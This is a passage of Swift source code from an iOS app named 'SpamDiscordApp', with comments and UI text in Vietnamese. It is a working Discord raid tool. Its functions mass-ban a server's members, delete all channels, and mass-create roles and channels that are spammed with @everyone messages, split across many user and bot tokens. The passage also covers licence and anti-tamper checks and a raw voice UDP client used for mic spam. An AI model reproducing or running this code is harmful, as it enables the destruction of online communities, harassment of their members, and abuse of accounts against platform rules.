                    if uid == myUser.id || uid == ownerId || (u["bot"] as? Bool) == true { return }
                    let mr = m["roles"] as? [String] ?? []
                    let mm = mr.compactMap { roleMap[$0]?.position }.max() ?? 0
                    if mm >= myMax { return }
                    if filterByRole {
                        if !mr.contains(options.banRoleId) { return }
                        if mr.compactMap({ roleMap[$0]?.position }).contains(where: { $0 > rolePosition }) { return }
                    }
                    lock.lock(); candidates.append(uid); lock.unlock()
                }, onProgress: { c in Task { @MainActor in self.membersScanned = c } })
            }

            log("  Tìm thấy \(candidates.count) target")
            guard !candidates.isEmpty else { log("  Không có ai để ban"); return }

            let queue = candidates
            let idxBox = IndexBox()
            let delay = options.banDelay
            let manager = self

            await withTaskGroup(of: Void.self) { group in
                for client in clients {
                    group.addTask {
                        while !(await manager.isCancelled) {
                            let i = idxBox.next()
                            if i >= queue.count { break }
                            let uid = queue[i]
                            if delay > 0 { try? await Task.sleep(nanoseconds: UInt64(delay * 1_000_000_000)) }
                            do {
                                try await client.banMember(gid, uid: uid)
                                await MainActor.run { manager.banSuccess += 1 }
                            } catch {
                                await MainActor.run { manager.banFailed += 1 }
                            }
                        }
                    }
                }
            }
            log("  Ban xong: \(banSuccess) OK / \(banFailed) FAIL")
        } catch { log("  Lỗi mass ban: \(error.localizedDescription)") }
    }

    private func doDeleteChannels(_ clients: [UserNukeClient], _ gid: String, options: NukeConfig) async {
        do {
            let chans = try await clients[0].getChannels(gid)
            log("  Tìm \(chans.count) kênh")
            let idx = IndexBox(); var count = 0
            await withTaskGroup(of: Bool.self) { group in
                var inf = 0
                for _ in 0..<chans.count {
                    if isCancelled { break }
                    let client = clients[Int.random(in: 0..<clients.count)]
                    let i = idx.next()
                    if i >= chans.count { break }
                    let ch = chans[i]
                    let d = options.deleteDelay
                    group.addTask {
                        if d > 0 { try? await Task.sleep(nanoseconds: UInt64(d * 1_000_000_000)) }
                        do { try await client.deleteChannel(ch.id); return true } catch { return false }
                    }
                    inf += 1
                    if inf >= 10 { if let r = await group.next(), r { count += 1 }; inf -= 1 }
                }
                for await r in group { if r { count += 1 } }
            }
            channelsDeleted = count
            log("  Đã xóa: \(count)")
        } catch { log("  Lỗi: \(error.localizedDescription)") }
    }

    private func doCreateRoles(_ clients: [UserNukeClient], _ gid: String, options: NukeConfig) async -> Int {
        var count = 0
        await withTaskGroup(of: Bool.self) { group in
            var inf = 0
            for _ in 0..<options.roleCount {
                if isCancelled { break }
                let client = clients[Int.random(in: 0..<clients.count)]
                let d = options.createRoleDelay
                let n = options.roleName
                group.addTask {
                    if d > 0 { try? await Task.sleep(nanoseconds: UInt64(d * 1_000_000_000)) }
                    do { try await client.createRole(gid, name: n); return true } catch { return false }
                }
                inf += 1
                if inf >= 10 { if let r = await group.next(), r { count += 1 }; inf -= 1 }
            }
            for await r in group { if r { count += 1 } }
        }
        return count
    }

    private func doCreateChannels(_ clients: [UserNukeClient], _ gid: String, options: NukeConfig) async -> (Int, Int) {
        var created = 0, sent = 0
        var content = options.messageContent
        if options.tagEveryone && !content.contains("@everyone") { content += "\n\n@everyone" }
        await withTaskGroup(of: (Bool, Bool).self) { group in
            var inf = 0
            for _ in 0..<options.channelCount {
                if isCancelled { break }
                let client = clients[Int.random(in: 0..<clients.count)]
                let cd = options.createChDelay, md = options.msgDelay
                let cn = options.channelName
                group.addTask {
                    if cd > 0 { try? await Task.sleep(nanoseconds: UInt64(cd * 1_000_000_000)) }
                    do {
                        guard let chId = try await client.createChannel(gid, name: cn, openEveryone: true) else { return (false, false) }
                        if !content.trimmingCharacters(in: .whitespaces).isEmpty {
                            if md > 0 { try? await Task.sleep(nanoseconds: UInt64(md * 1_000_000_000)) }
                            do { try await client.sendMessage(chId, content: content); return (true, true) }
                            catch { return (true, false) }
                        }
                        return (true, false)
                    } catch { return (false, false) }
                }
                inf += 1
                if inf >= 8 {
                    if let (cc, ss) = await group.next() { if cc { created += 1 }; if ss { sent += 1 } }
                    inf -= 1
                }
            }
            for await (cc, ss) in group { if cc { created += 1 }; if ss { sent += 1 } }
        }
        return (created, sent)
    }
}

final class IndexBox: @unchecked Sendable {
    private var value = 0
    private let lock = NSLock()
    func next() -> Int { lock.lock(); defer { lock.unlock() }; let v = value; value += 1; return v }
}

// ==========================================
// MARK: - LICENSE API
// ==========================================
struct LicenseActivationResponse: Codable {
    let valid: Bool?
    let createdAt: Int64?
    let expiresAt: Int64?
    let sessionToken: String?
    let assets: RemoteAssetsDTO?
    let config: RemoteConfigDTO?
    let message: String?
    let error: String?
    let cracked: Bool?
    let expired: Bool?

    enum CodingKeys: String, CodingKey {
        case valid, message, error, assets, config, cracked, expired
        case createdAt = "created_at"
        case expiresAt = "expires_at"
        case sessionToken = "session_token"
    }
}

struct LicenseValidationResponse: Codable {
    let valid: Bool?
    let createdAt: Int64?
    let expiresAt: Int64?
    let sessionToken: String?
    let assets: RemoteAssetsDTO?
    let error: String?
    let cracked: Bool?
    let expired: Bool?

    enum CodingKeys: String, CodingKey {
        case valid, error, assets, cracked, expired
        case createdAt = "created_at"
        case expiresAt = "expires_at"
        case sessionToken = "session_token"
    }
}

enum LicenseStatus: Equatable {
    case notActivated
    case checking
    case valid(expiresOn: Date)
    case expired(expiresOn: Date)
    case invalid(reason: String)
    case cracked(reason: String)
}

final class LicenseAPIClient {
    static let shared = LicenseAPIClient()
    var baseURL: String { SecureAPIClient.shared.baseURL }

    private func machineID() -> String { MachineID.get() }

    func activate(key: String) async throws -> LicenseActivationResponse {
        let report = AppIntegrityAuditor.shared.collectReport()
        return try await SecureAPIClient.shared.sendEncryptedRequest(
            endpoint: "/activate",
            bodyDict: [
                "license_key": key,
                "machine_id": machineID(),
                "integrity": report.payload
            ]
        )
    }

    func validate(key: String) async throws -> LicenseValidationResponse {
        let report = AppIntegrityAuditor.shared.collectReport()
        return try await SecureAPIClient.shared.sendEncryptedRequest(
            endpoint: "/validate",
            bodyDict: [
                "license_key": key,
                "machine_id": machineID(),
                "integrity": report.payload
            ]
        )
    }
}

@MainActor
final class LicenseManager: ObservableObject {
    static let shared = LicenseManager()

    @Published var status: LicenseStatus = .notActivated
    @Published var licenseKey: String? = nil
    @Published var activatedAt: Date? = nil
    @Published var isChecking = false
    @Published var isPermitReady = false
    @Published var isRevalidatingOnResume = false

    private let keyStoreKey = "QT_LicenseKey_Server"
    private let expiryStoreKey = "QT_LicenseExpiry"
    private let lastCheckKey = "QT_LicenseLastCheck"
    private let activatedStoreKey = "QT_LicenseActivatedAt"
    private var periodicTimer: Timer?
    private var isRefreshInFlight = false
    private var needsForegroundReauth = false

    init() {
        AppIntegrityAuditor.shared.enforceAntiDebug()
        SecurityGuard.shared.purgeLegacyDiskCache()

        licenseKey = PersistentStorage.shared.readString(forKey: keyStoreKey)
        if let s = PersistentStorage.shared.readString(forKey: activatedStoreKey),
           let d = Double(s) {
            activatedAt = Date(timeIntervalSince1970: d)
        }

        let report = AppIntegrityAuditor.shared.collectReport()
        if report.tampered {
            clearRuntimePermit()
            SecurityGuard.shared.markCompromised(reason: report.reasons.joined(separator: ","))
            status = .cracked(reason: "Phát hiện can thiệp hoặc thay đổi trái phép ứng dụng.")
            return
        }

        // BẮT BUỘC: Không mở app từ cache cục bộ khi khởi động — luôn xác thực trực tiếp với server CLF
        clearRuntimePermit()
        if let key = licenseKey, !key.isEmpty {
            status = .checking
            Task { @MainActor [weak self] in await self?.refreshStatus(force: true) }
            startPeriodicCheck()
        } else {
            status = .notActivated
        }
    }

    private func syncPermitReady() {
        isPermitReady = SecurityGuard.shared.verifyExecutionPermit()
    }

    private func clearRuntimePermit() {
        AppEndpoints.clear()
        SecurityGuard.shared.clearSession()
        isPermitReady = false
    }

    private func revokeLocalLicense(reason: String) {
        for k in [keyStoreKey, expiryStoreKey, lastCheckKey, activatedStoreKey, "QT_CachedSessionToken"] {
            PersistentStorage.shared.delete(forKey: k)
        }
        licenseKey = nil
        activatedAt = nil
        clearRuntimePermit()
        stopPeriodicCheck()
        status = .invalid(reason: reason)
    }

    private func lockForTamper(reason: String) {
        for k in [keyStoreKey, expiryStoreKey, lastCheckKey, activatedStoreKey, "QT_CachedSessionToken"] {
            PersistentStorage.shared.delete(forKey: k)
        }
        licenseKey = nil
        activatedAt = nil
        SecurityGuard.shared.markCompromised(reason: reason)
        AppEndpoints.clear()
        isPermitReady = false
        stopPeriodicCheck()
        status = .cracked(reason: reason)
    }

    private func startPeriodicCheck() {
        periodicTimer?.invalidate()
        periodicTimer = Timer.scheduledTimer(withTimeInterval: 60.0, repeats: true) { [weak self] _ in
            Task { @MainActor [weak self] in
                guard let self = self, let k = self.licenseKey, !k.isEmpty else { return }
                await self.refreshStatus()
            }
        }
    }

    private func stopPeriodicCheck() {
        periodicTimer?.invalidate()
        periodicTimer = nil
    }

    /// Gọi khi người dùng thoát app ra nền: đánh dấu bắt buộc kiểm tra lại key khi quay lại & xóa cấu hình chức năng không dùng khỏi RAM
    func markDidEnterBackground(activeScopes: Set<FeatureScope>) {
        needsForegroundReauth = true
        RemoteFeatureVault.shared.clearInactiveScopes(keeping: activeScopes)
    }

    /// Gọi mỗi khi quay lại app từ nền: luôn kiểm tra lại key trực tiếp trên server CLF
    func verifyOnForegroundResume() async {
        guard needsForegroundReauth else { return }
        needsForegroundReauth = false

        let report = AppIntegrityAuditor.shared.collectReport()
        if report.tampered {
            lockForTamper(reason: "Phát hiện can thiệp môi trường chạy ứng dụng.")
            return
        }

        guard let key = licenseKey, !key.isEmpty else {
            clearRuntimePermit()
            status = .notActivated
            return
        }

        isRevalidatingOnResume = true
        defer { isRevalidatingOnResume = false }
        await refreshStatus(force: true)
    }

    /// BẮT BUỘC gọi trước khi sử dụng bất kỳ chức năng nào: gửi key + mã chức năng lên server CLF để nhận đúng cấu hình của chức năng đó vào RAM
    func authorizeFeature(_ scope: FeatureScope) async -> Bool {
        let report = AppIntegrityAuditor.shared.collectReport()
        if report.tampered {
            lockForTamper(reason: "Phát hiện can thiệp hoặc thay đổi trái phép ứng dụng.")
            return false
        }

        guard let key = licenseKey, !key.isEmpty else {
            clearRuntimePermit()
            status = .notActivated
            return false
        }

        do {
            let res = try await ConfigAPIClient.shared.authorizeFeature(key: key, feature: scope)

            if res.cracked == true {
                lockForTamper(reason: res.error ?? "Ứng dụng hoặc key không hợp lệ.")
                return false
            }

            if res.expired == true || (res.expiresAt != nil && Date().timeIntervalSince1970 * 1000 > Double(res.expiresAt!)) {
                let exp = res.expiresAt != nil ? Date(timeIntervalSince1970: Double(res.expiresAt!) / 1000) : Date()
                clearRuntimePermit()
                stopPeriodicCheck()
                status = .expired(expiresOn: exp)
                return false
            }

            if res.valid == false || (res.valid != true && res.error != nil) {
                revokeLocalLicense(reason: res.error ?? "License key không hợp lệ hoặc đã bị thu hồi.")
                return false
            }

            guard res.valid == true,
                  let cfg = res.config,
                  let fTok = res.featureToken, !fTok.isEmpty,
                  let fExp = res.featureExp,
                  let expMs = res.expiresAt else {
                return false
            }

            if let sTok = res.sessionToken {
                _ = SecurityGuard.shared.updateSessionToken(sTok)
            }
            AppEndpoints.applyCDN(avatars: cfg.cdn_avatars, icons: cfg.cdn_icons)
            RemoteFeatureVault.shared.applyScopedConfig(cfg, feature: scope, featureToken: fTok, featureExp: fExp)
            syncPermitReady()

            let exp = Date(timeIntervalSince1970: Double(expMs) / 1000)
            PersistentStorage.shared.saveString("\(exp.timeIntervalSince1970)", forKey: expiryStoreKey)
            PersistentStorage.shared.saveString("\(Date().timeIntervalSince1970)", forKey: lastCheckKey)

            if Date() > exp {
                clearRuntimePermit()
                stopPeriodicCheck()
                status = .expired(expiresOn: exp)
                return false
            }

            guard isPermitReady else {
                clearRuntimePermit()
                status = .invalid(reason: "Phiên xác thực không khớp thiết bị.")
                return false
            }

            status = .valid(expiresOn: exp)
            return true
        } catch let err as NSError {
            if err.domain == "LicenseRejected" {
                revokeLocalLicense(reason: err.localizedDescription)
            }
            return false
        }
    }

    func activate(key: String) async -> LicenseStatus {
        let report = AppIntegrityAuditor.shared.collectReport()
        if report.tampered {
            lockForTamper(reason: "Phát hiện can thiệp hoặc thay đổi trái phép ứng dụng.")
            return status
        }

        let clean = key.trimmingCharacters(in: .whitespacesAndNewlines).uppercased()
        guard !clean.isEmpty else { status = .invalid(reason: "Vui lòng nhập License Key"); return status }
        isChecking = true
        defer { isChecking = false }
        do {
            let res = try await LicenseAPIClient.shared.activate(key: clean)
            if res.cracked == true {
                lockForTamper(reason: res.error ?? "Ứng dụng hoặc key đã bị vô hiệu hóa.")
                return status
            }
            if res.expired == true {
                let exp = res.expiresAt != nil ? Date(timeIntervalSince1970: Double(res.expiresAt!) / 1000) : Date()
                clearRuntimePermit()
                status = .expired(expiresOn: exp)
                return status
            }
            guard res.valid == true, let expMs = res.expiresAt else {
                clearRuntimePermit()
                status = .invalid(reason: res.error ?? "Key không hợp lệ hoặc đã bị xóa.")
                return status
            }
            if let token = res.sessionToken {
                _ = SecurityGuard.shared.updateSessionToken(token)
            }
            AppEndpoints.applyAssets(res.assets)
            let exp = Date(timeIntervalSince1970: Double(expMs) / 1000)
            let now = res.createdAt != nil ? Date(timeIntervalSince1970: Double(res.createdAt!) / 1000) : Date()
            PersistentStorage.shared.saveString(clean, forKey: keyStoreKey)
            PersistentStorage.shared.saveString("\(exp.timeIntervalSince1970)", forKey: expiryStoreKey)
            PersistentStorage.shared.saveString("\(Date().timeIntervalSince1970)", forKey: lastCheckKey)
            PersistentStorage.shared.saveString("\(now.timeIntervalSince1970)", forKey: activatedStoreKey)
            licenseKey = clean
            activatedAt = now
            syncPermitReady()

            if Date() > exp {
                clearRuntimePermit()
                status = .expired(expiresOn: exp)
                return status
            }

            if !isPermitReady {
                clearRuntimePermit()
                status = .invalid(reason: "Không nhận được phiên xác thực hợp lệ từ máy chủ.")
                return status
            }

            status = .valid(expiresOn: exp)
            startPeriodicCheck()
            return status
        } catch let err as NSError {
            clearRuntimePermit()
            status = .invalid(reason: "Lỗi kích hoạt: \(err.localizedDescription)")
            return status
        }
    }

    func refreshStatus(force: Bool = false) async {
        let report = AppIntegrityAuditor.shared.collectReport()
        if report.tampered {
            lockForTamper(reason: "Phát hiện can thiệp hoặc thay đổi trái phép ứng dụng.")
            return
        }

        guard let key = licenseKey, !key.isEmpty else {
            clearRuntimePermit()
            stopPeriodicCheck()
            status = .notActivated
            return
        }
        if isRefreshInFlight && !force { return }
        isRefreshInFlight = true
        isChecking = true
        defer {
            isRefreshInFlight = false
            isChecking = false
        }
        await fetchAndApplyConfig(key: key)
    }

    private func fetchAndApplyConfig(key: String) async {
        do {
            let res = try await ConfigAPIClient.shared.fetchConfig(key: key)

            if res.cracked == true {
                lockForTamper(reason: res.error ?? "Key hoặc bản cài đặt đã bị vô hiệu hóa.")
                return
            }

            if res.expired == true || (res.expiresAt != nil && Date().timeIntervalSince1970 * 1000 > Double(res.expiresAt!)) {
                let exp = res.expiresAt != nil ? Date(timeIntervalSince1970: Double(res.expiresAt!) / 1000) : Date()
                clearRuntimePermit()
                stopPeriodicCheck()
                status = .expired(expiresOn: exp)
                return
            }

            if res.valid == false || (res.valid != true && res.error != nil) {
                revokeLocalLicense(reason: res.error ?? "License key đã bị xóa hoặc không còn hợp lệ.")
                return
            }

            guard res.valid == true, let expMs = res.expiresAt, let token = res.sessionToken else {
                clearRuntimePermit()
                status = .invalid(reason: res.error ?? "Key không tồn tại hoặc máy chủ không trả về phiên xác thực.")
                return
            }

            let okTok = SecurityGuard.shared.updateSessionToken(token)
            if let ca = res.createdAt {
                let actDate = Date(timeIntervalSince1970: Double(ca) / 1000)
                activatedAt = actDate
                PersistentStorage.shared.saveString("\(actDate.timeIntervalSince1970)", forKey: activatedStoreKey)
            }
            AppEndpoints.applyAssets(res.assets)
            syncPermitReady()

            let exp = Date(timeIntervalSince1970: Double(expMs) / 1000)
            PersistentStorage.shared.saveString("\(exp.timeIntervalSince1970)", forKey: expiryStoreKey)
            PersistentStorage.shared.saveString("\(Date().timeIntervalSince1970)", forKey: lastCheckKey)

            if Date() > exp {
                clearRuntimePermit()
                stopPeriodicCheck()
                status = .expired(expiresOn: exp)
            } else if okTok && isPermitReady {
                status = .valid(expiresOn: exp)
                startPeriodicCheck()
            } else {
                clearRuntimePermit()
                status = .invalid(reason: "Phiên xác thực hết hạn hoặc không khớp thiết bị. Vui lòng nhập lại key.")
            }
        } catch let err as NSError {
            if err.domain == "LicenseRejected" {
                revokeLocalLicense(reason: err.localizedDescription)
                return
            }

            // Không vượt qua bước kiểm tra khi khởi động nếu không kết nối được server!
            if case .checking = status {
                clearRuntimePermit()
                status = .invalid(reason: "Không thể xác thực bản quyền với máy chủ: \(err.localizedDescription)")
                return
            }

            // Nếu đang trong phiên hợp lệ và gặp lỗi mạng thoáng qua, kiểm tra thời hạn RAM-only
            syncPermitReady()
            if let s = PersistentStorage.shared.readString(forKey: expiryStoreKey),
               let d = Double(s) {
                let exp = Date(timeIntervalSince1970: d)
                if Date() > exp {
                    clearRuntimePermit()
                    stopPeriodicCheck()
                    status = .expired(expiresOn: exp)
                    return
                } else if isPermitReady {
                    status = .valid(expiresOn: exp)
                    return
                }
            }

            clearRuntimePermit()
            status = .invalid(reason: "Không thể xác thực bản quyền: \(err.localizedDescription)")
        }
    }

    func deactivate() {
        for k in [keyStoreKey, expiryStoreKey, lastCheckKey, activatedStoreKey, "QT_CachedSessionToken"] {
            PersistentStorage.shared.delete(forKey: k)
        }
        licenseKey = nil
        activatedAt = nil
        clearRuntimePermit()
        stopPeriodicCheck()
        status = .notActivated
    }

    var isUnlocked: Bool {
        if case .valid = status, isPermitReady { return true }
        return false
    }

    func formatDateTime(_ d: Date) -> String {
        let df = DateFormatter()
        df.dateFormat = "dd/MM/yyyy HH:mm:ss"
        df.locale = Locale(identifier: "vi_VN")
        return df.string(from: d)
    }

    func formatDate(_ d: Date) -> String {
        return formatDateTime(d)
    }

    func timeRemaining(until target: Date) -> String {
        let now = Date()
        guard target > now else { return "Đã hết hạn" }
        let diff = Int(target.timeIntervalSince(now))
        let days = diff / 86400
        let hours = (diff % 86400) / 3600
        let minutes = (diff % 3600) / 60
        let seconds = diff % 60
        if days > 0 {
            return "\(days) ngày \(hours) giờ \(minutes) phút \(seconds) giây"
        } else if hours > 0 {
            return "\(hours) giờ \(minutes) phút \(seconds) giây"
        } else {
            return "\(minutes) phút \(seconds) giây"
        }
    }

    var statusText: String {
        switch status {
        case .notActivated: return "Chưa kích hoạt"
        case .checking: return "Đang kiểm tra..."
        case .valid(let d): return "Còn hạn đến \(formatDateTime(d))"
        case .expired(let d): return "Đã hết hạn ngày \(formatDateTime(d))"
        case .invalid(let r): return r
        case .cracked(let r): return r
        }
    }
}

// (CrackedView, LoadingView, LockView, LicenseAdminInfoView, AboutView -> ModernViews.swift)

// ==========================================
// MARK: - APP ENTRY
// ==========================================
@main
struct SpamDiscordApp: App {
    @StateObject private var app = AppState()
    @StateObject private var bot = BotManager()
    @StateObject private var userNuke = UserNukeManager()
    @StateObject private var license = LicenseManager.shared
    @StateObject private var voiceRoom = VoiceRoomManager.shared
    @StateObject private var musicStream = MusicStreamManager.shared
    @Environment(\.scenePhase) private var scenePhase

    var body: some Scene {
        WindowGroup {
            Group {
                switch license.status {
                case .valid:
                    if license.isPermitReady {
                        ZStack(alignment: .top) {
                            MainTabView()
                                .environmentObject(app)
                                .environmentObject(bot)
                                .environmentObject(userNuke)
                                .environmentObject(license)
                                .environmentObject(voiceRoom)
                                .environmentObject(musicStream)

                            if license.isRevalidatingOnResume {
                                HStack(spacing: 8) {
                                    ProgressView().scaleEffect(0.75).tint(.white)
                                    Text("Đang xác thực lại bản quyền...")
                                        .font(.caption.bold())
                                        .foregroundColor(.white)
                                }
                                .padding(.horizontal, 14)
                                .padding(.vertical, 8)
                                .background(Color.indigo.opacity(0.92), in: Capsule())
                                .shadow(color: .black.opacity(0.25), radius: 10, y: 4)
                                .padding(.top, 8)
                                .transition(.move(edge: .top).combined(with: .opacity))
                            }
                        }
                        .animation(.easeInOut(duration: 0.2), value: license.isRevalidatingOnResume)
                    } else {
                        LoadingView().environmentObject(license)
                    }
                case .checking:
                    LoadingView().environmentObject(license)
                case .cracked(let reason):
                    CrackedView(message: reason).environmentObject(license)
                case .notActivated, .expired, .invalid:
                    LockView().environmentObject(license)
                }
            }
            .onChange(of: scenePhase) { phase in
                switch phase {
                case .active:
                    Task { @MainActor in await license.verifyOnForegroundResume() }
                    voiceRoom.setAppInBackground(false)
                    if app.isSending, license.isUnlocked {
                        BackgroundManager.shared.start(tag: "spam")
                    }
                    if voiceRoom.isRunning {
                        BackgroundManager.shared.start(tag: "treo")
                    }
                    if musicStream.isPlaying {
                        BackgroundManager.shared.start(tag: "music")
                    }
                    if bot.isNuking {
                        BackgroundManager.shared.start(tag: "botNuke")
                    }
                    if userNuke.isNuking {
                        BackgroundManager.shared.start(tag: "userNuke")
                    }
                    NowPlayingHelper.shared.refreshNowPlaying()
                case .background, .inactive:
                    if voiceRoom.isRunning || musicStream.isPlaying || app.isSending || bot.isNuking || userNuke.isNuking || BackgroundManager.shared.isKeepAliveActive {
                        BackgroundManager.shared.ensureRunning()
                        NowPlayingHelper.shared.refreshNowPlaying()
                    }
                    if phase == .background {
                        voiceRoom.setAppInBackground(true)
                        var activeScopes: Set<FeatureScope> = []
                        if voiceRoom.isRunning { activeScopes.insert(.voice) }
                        if musicStream.isPlaying { activeScopes.insert(.music) }
                        if app.isSending { activeScopes.insert(.spam) }
                        if bot.isNuking { activeScopes.insert(.botNuke) }
                        if userNuke.isNuking { activeScopes.insert(.userNuke) }
                        license.markDidEnterBackground(activeScopes: activeScopes)
                    }
                @unknown default:
                    break
                }
            }
            .onChange(of: license.isUnlocked) { unlocked in
                if !unlocked {
                    app.stopSending()
                    bot.stopNuke()
                    userNuke.stop()
                    voiceRoom.stopTreo()
                    musicStream.stop()
                    BackgroundManager.shared.stopAll()
                    NowPlayingHelper.shared.stop()
                }
            }
        }
    }
}

// (MainTabView, NukeTabView, EmptyStateView, TokenListView, AddTokenSheet, SpamView, ChannelListView, SendView, BotNukeView, UserNukeView, NukeConfigSheet, StatCard -> ModernViews.swift)

// ==============================================================================
// MARK: - DISCORD VOICE GATEWAY & XẢ MIC VIP & TREO ROOM 24/7 (MAKE SUPER VIP)
// ==============================================================================

// MARK: - HELPER: DNS HOST RESOLUTION & GUILD ID FETCH
func resolveHostToIPv4(_ host: String) -> String? {
    var hints = addrinfo()
    hints.ai_family = AF_INET
    hints.ai_socktype = SOCK_DGRAM
    hints.ai_protocol = IPPROTO_UDP

    var res: UnsafeMutablePointer<addrinfo>?
    if getaddrinfo(host, nil, &hints, &res) == 0, let first = res {
        defer { freeaddrinfo(res) }
        let sockaddrIn = first.pointee.ai_addr.withMemoryRebound(to: sockaddr_in.self, capacity: 1) { $0.pointee }
        var addrCopy = sockaddrIn.sin_addr
        var ipBuf = [CChar](repeating: 0, count: Int(INET_ADDRSTRLEN))
        if inet_ntop(AF_INET, &addrCopy, &ipBuf, socklen_t(INET_ADDRSTRLEN)) != nil {
            return String(cString: ipBuf)
        }
    }
    return nil
}

func fetchGuildIdForChannel(token: String, channelId: String, scope: FeatureScope = .voice) async -> String? {
    guard SecurityGuard.shared.verifyExecutionPermit(),
          let url = RemoteFeatureVault.shared.makeURL(scope: scope, route: \.channel, replacements: ["channel_id": channelId]) else { return nil }
    var req = URLRequest(url: url)
    for (k, v) in RemoteFeatureVault.shared.basicAuthHeaders(scope: scope, token: token) {
        req.addValue(v, forHTTPHeaderField: k)
    }
    do {
        let (data, resp) = try await URLSession.shared.data(for: req)
        if let http = resp as? HTTPURLResponse, http.statusCode == 200 {
            if let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any] {
                return json["guild_id"] as? String
            }
        }
    } catch {
        return nil
    }
    return nil
}

/// Chuẩn hóa Voice Endpoint (GIỮ NGUYÊN :port như :2053, :2083, :8443 để tránh lỗi 4006)
func cleanVoiceEndpoint(_ endpoint: String) -> String {
    var ep = endpoint.trimmingCharacters(in: .whitespacesAndNewlines)
    if ep.hasPrefix("wss://") { ep = String(ep.dropFirst(6)) }
    if ep.hasPrefix("ws://") { ep = String(ep.dropFirst(5)) }
    if let slash = ep.firstIndex(of: "/") { ep = String(ep[..<slash]) }
    if ep.hasSuffix(":80") { ep = String(ep.dropLast(3)) }
    return ep.trimmingCharacters(in: .whitespacesAndNewlines)
}

/// Trích xuất User ID snowflake trực tiếp từ Token Discord (phần Base64 đầu tiên)
func extractUserId(from token: String) -> String? {
    let parts = token.components(separatedBy: ".")
    guard let first = parts.first, !first.isEmpty else { return nil }
    var base64 = first.replacingOccurrences(of: "-", with: "+").replacingOccurrences(of: "_", with: "/")
    while base64.count % 4 != 0 { base64.append("=") }
    if let data = Data(base64Encoded: base64),
       let idStr = String(data: data, encoding: .utf8),
       !idStr.isEmpty, idStr.allSatisfy({ $0.isNumber }) {
        return idStr
    }
    return nil
}

// MARK: - DISCORD VOICE UDP CLIENT & PROTOCOL HANDSHAKE
final class DiscordVoiceUDPClient {
    private let lock = NSLock()
    private var sockfd: Int32 = -1
    private var serverAddr: sockaddr_in?
    private(set) var isConnected = false

    func connect(ip: String, port: UInt16) -> Bool {
        close()
        let fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
        guard fd >= 0 else { return false }

        var tv = timeval(tv_sec: 2, tv_usec: 0)
        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, socklen_t(MemoryLayout<timeval>.size))
        var sndBuf: Int32 = 512 * 1024
        setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndBuf, socklen_t(MemoryLayout<Int32>.size))

        var addr = sockaddr_in()
        addr.sin_family = sa_family_t(AF_INET)
        addr.sin_port = port.bigEndian

        // Dùng inet_pton hoặc DNS resolve nếu server trả về domain name
        if inet_pton(AF_INET, ip, &addr.sin_addr) <= 0 {
            if let resolved = resolveHostToIPv4(ip) {
                inet_pton(AF_INET, resolved, &addr.sin_addr)
            } else {
                Darwin.close(fd)
                return false
            }
        }

        lock.lock()
        self.sockfd = fd
        self.serverAddr = addr
        self.isConnected = true
        lock.unlock()
        return true
    }

    /// IP Discovery (Discord Voice UDP Protocol RFC - Hỗ trợ retry 3 lần)
    func discoverIP(ssrc: UInt32) -> (ip: String, port: UInt16)? {
        lock.lock()
        let fd = sockfd
        guard fd >= 0, var addr = serverAddr else {
            lock.unlock()
            return nil
        }
        lock.unlock()

        var packet = [UInt8](repeating: 0, count: 74)
        packet[0] = 0x00
        packet[1] = 0x01
        packet[2] = 0x00
        packet[3] = 0x46
        packet[4] = UInt8((ssrc >> 24) & 0xFF)
        packet[5] = UInt8((ssrc >> 16) & 0xFF)
        packet[6] = UInt8((ssrc >> 8) & 0xFF)
        packet[7] = UInt8(ssrc & 0xFF)

        var tv = timeval(tv_sec: 1, tv_usec: 0)
        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, socklen_t(MemoryLayout<timeval>.size))

        for _ in 0..<3 {
            let sent = withUnsafePointer(to: &addr) { ptr -> Int in
                ptr.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                    packet.withUnsafeBufferPointer { buf in
                        Darwin.sendto(fd, buf.baseAddress, 74, 0, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
                    }
                }
            }
            guard sent == 74 else { continue }

            var response = [UInt8](repeating: 0, count: 74)
            var fromAddr = sockaddr_in()
            var fromLen = socklen_t(MemoryLayout<sockaddr_in>.size)

            let recvd = withUnsafeMutablePointer(to: &fromAddr) { ptr -> Int in
                ptr.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                    response.withUnsafeMutableBufferPointer { buf in
                        Darwin.recvfrom(fd, buf.baseAddress, 74, 0, sa, &fromLen)
                    }
                }
            }
            if recvd >= 74 {
                var ipBytes = [UInt8]()
                for i in 8..<72 {
                    if response[i] == 0 { break }
                    ipBytes.append(response[i])
                }
                if let myIP = String(bytes: ipBytes, encoding: .utf8), !myIP.isEmpty {
                    let myPort = (UInt16(response[72]) << 8) | UInt16(response[73])
                    return (myIP, myPort)
                }
            }
        }
        return nil
    }

    func sendPacket(_ data: Data) {
        lock.lock()
        let fd = sockfd
        guard fd >= 0, var addr = serverAddr else {
            lock.unlock()
            return
        }
        lock.unlock()
        _ = withUnsafePointer(to: &addr) { ptr -> Int in
            ptr.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                data.withUnsafeBytes { raw in
                    Darwin.sendto(fd, raw.baseAddress, data.count, 0, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
                }
            }
        }
    }

    func close() {
        lock.lock()
        let fd = sockfd
        sockfd = -1
        serverAddr = nil
        isConnected = false
        lock.unlock()
        if fd >= 0 {
            Darwin.close(fd)
        }
    }

    deinit {
        close()
    }
}

// MARK: - DAVE FFI BUFFER HELPER & E2EE SESSION (DISCORD DAVE / MLS PROTOCOL)
private func consumeDaveBuffer(_ buf: DaveByteBuffer) -> Data? {
    defer { dave_buffer_free(buf) }
    guard let ptr = buf.ptr, buf.len > 0 else { return nil }
    return Data(bytes: ptr, count: buf.len)
}

final class DaveE2EESession {
    private let lock = NSLock()
    private var handle: OpaquePointer?
    private(set) var protocolVersion: UInt16 = 0
    private let userId: UInt64
    private let channelId: UInt64
    private var pendingTransitions: [UInt16: UInt16] = [:]
    private var pendingExternalSender: Data?
    private var downgraded: Bool = false

    static var maxProtocolVersion: Int {
        Int(dave_max_protocol_version())
    }

    init(protocolVersion: UInt16, userId: UInt64, channelId: UInt64) {
        self.protocolVersion = protocolVersion
        self.userId = userId
        self.channelId = channelId
        self.downgraded = (protocolVersion == 0)
    }

    deinit {
        destroy()
    }

    func destroy() {
